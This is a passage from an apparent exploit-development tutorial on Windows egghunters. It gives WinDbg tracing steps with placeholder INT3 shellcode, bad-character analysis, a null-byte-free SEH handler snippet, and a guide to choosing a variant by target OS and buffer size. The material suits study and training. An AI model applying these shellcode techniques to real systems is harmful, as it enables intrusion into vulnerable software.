Search for the egghunter signature if you don't know the address:

```
; Search for NtDisplayString egghunter signature (OR CX with push 0x43):
0:000> s -b 0 L?0x7fffffff 66 81 C9 FF 0F 41 6A 43
; Returns address if found
```

### Step 2: Plant the Egg

```
; Find a writable, non-executed region:
0:000> !address -f:MEM_COMMIT,PAGE_READWRITE
; Pick any address from the output (call it TARGET_ADDR)

; Write the egg:
0:000> ed TARGET_ADDR 0x74303077
0:000> ed TARGET_ADDR+4 0x74303077

; Write placeholder shellcode (INT3):
0:000> eb TARGET_ADDR+8 cc cc cc cc cc cc cc cc

; Verify:
0:000> db TARGET_ADDR L 10
; Expected: 77 30 30 74 77 30 30 74 cc cc cc cc ...
```

### Step 3: Set Breakpoints and Run

```
; BP at egghunter start:
0:000> bp <egghunter_start>

; Trigger the vulnerability (send the exploit payload)
; When egghunter BP fires:
0:000> r ecx    ; initial ECX value
```

### Step 4: Trace Through the First Page Check

```
; For syscall-based (NtDisplayString):
0:000> t    ; or cx, 0x0fff
0:000> r    ; ECX = last byte of current page
0:000> t    ; inc ecx
0:000> r    ; ECX = first byte of next page (page-aligned)
0:000> t    ; push 0x43
0:000> t    ; pop eax
0:000> r eax  ; EAX = 0x43
0:000> t    ; cdq
0:000> r edx  ; EDX = 0
0:000> t    ; push ecx (save ECX)
0:000> t    ; push edx (MaximumLength = 0)
0:000> t    ; push ecx (Buffer)
0:000> t    ; push 2  (Length)
0:000> t    ; mov edx, esp
0:000> r edx  ; EDX = pointer to fake UNICODE_STRING
0:000> dd edx L 3  ; should show: 00000002, <ecx>, 00000000
0:000> t    ; int 0x2e
0:000> r eax  ; NTSTATUS — 0xC0000005 for unmapped page
0:000> t    ; add esp, 0x0C
0:000> t    ; pop ecx
0:000> r ecx  ; ECX = probe address (restored)
0:000> t    ; cmp al, 0x05
0:000> t    ; je (taken if AV returned)
```

### Step 5: Run to Egg Discovery

```
; Remove current BP, set BP at the final JMP ECX:
0:000> bc *
0:000> bp <egghunter_jmp_ecx_offset>
0:000> g

; When BP fires:
0:000> r ecx    ; should = TARGET_ADDR (egg location)
0:000> db ecx L 10  ; should show: 77 30 30 74 77 30 30 74 cc cc cc cc
0:000> t        ; execute JMP ECX (after ADD ECX, 8)
0:000> r eip    ; should = TARGET_ADDR + 8 = shellcode start

; Verify shellcode start:
0:000> db eip L 4  ; should show: cc cc cc cc (INT3 placeholders)
0:000> t        ; execute INT3 — WinDbg reports "int 3 encountered"
; Egghunter successfully found and jumped to shellcode!
```

### Step 6: Verify Register State at Jump

```
; At the moment of JMP ECX, verify:
0:000> r ecx    ; = TARGET_ADDR + 8 (after ADD ECX, 8)
0:000> r eip    ; = same (after JMP ECX)
0:000> r esp    ; = balanced (no spurious pushes remaining)

; For SEH-based: verify SEH chain was restored:
0:000> !exchain  ; should NOT show the egghunter's handler
```

---

## Bad Character Analysis for Both Variants

### NtDisplayString Egghunter Bad Chars

Bytes that appear in the assembled NtDisplayString egghunter:

```
01 02 03 04 05 08 0C 0F 2E 30 39 3C 41 43 51 52
58 59 6A 74 75 77 81 83 89 99 B8 C1 C4 CD D4 FF
```

Notable bytes:
- `\x99` (CDQ): present — some filters strip high bytes; verify delivery vector
- `\xFF`: present (in JMP ECX = FF E1, and OR mask) — filter if `\xff` is stripped
- `\x6A`: PUSH BYTE opcode — present in `push 0x43` and `push 2`
- No null bytes (`\x00`) in the egghunter body itself

### SEH-Based Egghunter Bad Chars

The SEH-based egghunter contains:

```
; Notable potential problem bytes:
\x64 \x00 \x00 \x00 \x00  — FS: segment prefix + offset 0 in MOV [fs:0], ...
```

The FS segment operations (`push dword [fs:0]` = `64 FF 35 00 00 00 00`) contain multiple null
bytes (`\x00`). This is a significant issue for delivery vectors that terminate on null bytes.

**Fix for null-byte problem in SEH handler installation**: The FS-based SEH install sequence is
inherently null-byte-heavy. Alternatives:

1. Use register-based addressing to avoid the immediate 0 in the FS offset:
   ```nasm
   xor  eax, eax         ; 33 C0  EAX = 0 (no null in opcode)
   push [fs:eax]         ; 64 FF 30  push [fs+0] without null bytes
   mov  [fs:eax], esp    ; 64 89 20  mov [fs+0], esp without null bytes
   ```
   This avoids null bytes in the FS: instructions.

2. Only use the SEH-based egghunter when null bytes are not a constraint (e.g., binary protocol).

---

## Choosing Between the Two Variants

| Criterion | NtAccessCheckAndAuditAlarm | NtDisplayString | SEH-Based |
|-----------|---------------------------|-----------------|-----------|
| Size | ~32–39 bytes | ~49 bytes | ~60 bytes |
| Windows XP/2003 | Yes (syscall 0x02) | Yes (syscall 0x43) | Yes |
| Windows Vista/7+ | No (wrong syscall#) | No (wrong syscall#) | Yes |
| Null bytes in code | None | None | Yes (FS: offsets) |
| Requires SEH setup | No | No | Yes |
| Robustness (error codes) | AL==0x05 only | AL==0x05 only | All faults |
| Typical use case | XP/2003 exploits, CTF | XP/2003 (alt. build) | Any modern target |

**Quick selection guide**:
- Target is XP SP2/SP3 or Server 2003, buffer < 40 bytes: use NtAccessCheckAndAuditAlarm
- Target is XP, buffer 40–55 bytes, null bytes allowed: use NtDisplayString
- Target is Vista or later, any buffer: use SEH-based egghunter
- Unknown OS version: use SEH-based egghunter (verify FS null-byte handling)

---

*See also*:
- `Egghunter_Internals.md` — general concepts, memory layout, page-skip algorithm
- `NtAccessCheck_Egghunter.md` — the classic 32-byte Skape variant
- `../SEH/SEH_Exploitation.md` — SEH overwrite exploitation for stage-1 delivery
